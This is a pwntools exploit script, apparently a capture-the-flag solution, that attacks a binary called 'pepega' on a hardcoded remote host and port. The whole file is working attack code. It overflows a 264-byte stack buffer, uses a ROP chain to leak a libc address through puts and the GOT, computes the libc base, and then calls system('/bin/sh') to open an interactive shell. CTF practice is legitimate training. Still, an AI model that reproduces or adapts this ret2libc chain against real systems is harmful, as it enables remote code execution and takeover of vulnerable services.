#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 54.179.3.37 --port 10030 ./pepega
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pepega_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '54.179.3.37'
port = int(args.PORT or 10030)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
b *0x40120f
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

libc = exe.libc
got_read=0x404020
got_put=0x404018
got_setv=0x404028
plt_puts=0x401030
pop_rdi = 0x0000000000401293
main=0x4011d9

p = 'a'*264
p += p64(pop_rdi)
p += p64(got_put)
p += p64(plt_puts)
p += p64(main)
io.sendline(p)
io.recvline()

leak = u64(io.recvline()[:-1].ljust(8,"\x00"))
print (hex(leak))

libc.address = leak - libc.sym['puts']
print(hex(libc.address))
system = libc.sym['system']
bin_sh = libc.search("/bin/sh").next()
print hex(libc.address)

p = b'a'*264
p += p64(pop_rdi)
p += p64(bin_sh)
p += p64(pop_rdi+1)
p += p64(system)
io.sendline(p)

io.interactive()

